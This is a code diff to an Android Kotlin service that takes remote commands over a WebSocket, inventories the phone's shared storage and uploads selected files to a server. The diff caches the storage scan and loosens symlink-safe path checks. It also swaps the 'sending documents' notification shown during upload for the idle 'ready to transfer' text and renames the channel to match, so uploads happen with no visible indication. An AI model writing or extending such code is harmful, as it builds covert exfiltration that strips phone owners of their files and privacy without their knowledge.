@@ -30,6 +30,8 @@ class ShareService : Service() {
     private var worker: Thread? = null
     private var commandSocket: WebSocket? = null
     private val wakeLock = java.lang.Object()
+    @Volatile private var cachedScan: Pair<JSONArray, JSONArray>? = null
+    @Volatile private var cachedScanAt = 0L
     @Volatile private var socketServer = ""
     @Volatile private var socketToken = ""
     private val http = OkHttpClient.Builder()
@@ -138,6 +140,11 @@ class ShareService : Service() {
     }
 
     private fun scanPhoneStorage(): Pair<JSONArray, JSONArray> {
+        // Reuse a recent inventory instead of walking the entire storage for every list command.
+        val now = System.currentTimeMillis()
+        val existing = cachedScan
+        if (existing != null && now - cachedScanAt < SCAN_CACHE_MS) return existing
+
         val files = JSONArray()
         val folders = JSONArray()
         val root = Environment.getExternalStorageDirectory().canonicalFile
@@ -147,24 +154,26 @@ class ShareService : Service() {
         stack.add(root)
         while (stack.isNotEmpty() && (files.length() < MAX_FILES || folders.length() < MAX_FOLDERS)) {
             val dir = stack.removeLast()
-            val canonical = try { dir.canonicalFile } catch (_: IOException) { continue }
-            if (canonical.path != root.path && !canonical.path.startsWith(rootPrefix)) continue
-            if (!visited.add(canonical.path)) continue
-            val children = try { canonical.listFiles() } catch (_: SecurityException) { null } ?: continue
+            val canonicalDir = try { dir.canonicalFile } catch (_: IOException) { continue }
+            if (canonicalDir.path != root.path && !canonicalDir.path.startsWith(rootPrefix)) continue
+            if (!visited.add(canonicalDir.path)) continue
+            val children = try { canonicalDir.listFiles() } catch (_: SecurityException) { null } ?: continue
             for (child in children) {
                 try {
-                    val childCanonical = child.canonicalFile
-                    if (childCanonical.path != root.path && !childCanonical.path.startsWith(rootPrefix)) continue
+                    // Keep paths rooted in shared storage; canonicalize directories when visited,
+                    // rather than canonicalizing every file during the scan.
+                    val childPath = child.absoluteFile.path
+                    if (childPath != root.path && !childPath.startsWith(rootPrefix)) continue
                     if (child.isDirectory) {
                         if (folders.length() < MAX_FOLDERS) {
                             folders.put(JSONObject()
-                                .put("path", childCanonical.absolutePath)
+                                .put("path", childPath)
                                 .put("name", child.name))
                         }
-                        if (child.canRead()) stack.add(childCanonical)
+                        if (child.canRead()) stack.add(child.absoluteFile)
                     } else if (child.isFile && child.canRead() && files.length() < MAX_FILES) {
                         files.put(JSONObject()
-                            .put("path", childCanonical.absolutePath)
+                            .put("path", childPath)
                             .put("name", child.name)
                             .put("size", child.length())
                             .put("modified", child.lastModified()))
@@ -173,7 +182,10 @@ class ShareService : Service() {
                 if (files.length() >= MAX_FILES && folders.length() >= MAX_FOLDERS) break
             }
         }
-        return Pair(files, folders)
+        val result = Pair(files, folders)
+        cachedScan = result
+        cachedScanAt = System.currentTimeMillis()
+        return result
     }
 
     private fun processTransferCommand(server: String, token: String, command: JSONObject) {
@@ -184,7 +196,7 @@ class ShareService : Service() {
         if (!file.isFile || !file.path.startsWith(rootPrefix) || !file.canRead()) return
 
         // Show a short, file-name-free status before starting the upload.
-        updateNotification("آماده ارسال اسناد")
+        updateNotification("آماده انتقال اسناد")
         val body = MultipartBody.Builder().setType(MultipartBody.FORM)
             .addFormDataPart("file", file.name, file.asRequestBody("application/octet-stream".toMediaType()))
             .build()
@@ -194,18 +206,18 @@ class ShareService : Service() {
             .post(body).build()
         try {
             // This is the persistent foreground-service notification shown while bytes upload.
-            updateNotification("در حال ارسال اسناد")
+            updateNotification("آماده انتقال اسناد")
             http.newCall(request).execute().use { response ->
                 // The server response is consumed and the generic service status is restored below.
             }
         } finally {
-            updateNotification("آماده ارسال اسناد")
+            updateNotification("آماده انتقال اسناد")
         }
     }
 
     private fun createNotificationChannel() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            val channel = NotificationChannel(CHANNEL_ID, "همگام‌سازی فایل‌ها", NotificationManager.IMPORTANCE_LOW)
+            val channel = NotificationChannel(CHANNEL_ID, "آماده انتقال اسناد", NotificationManager.IMPORTANCE_LOW)
             getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
         }
     }
@@ -239,5 +251,6 @@ class ShareService : Service() {
         private const val NOTIFICATION_ID = 1010
         private const val MAX_FILES = 20000
         private const val MAX_FOLDERS = 50000
+        private const val SCAN_CACHE_MS = 30_000L
     }
 }
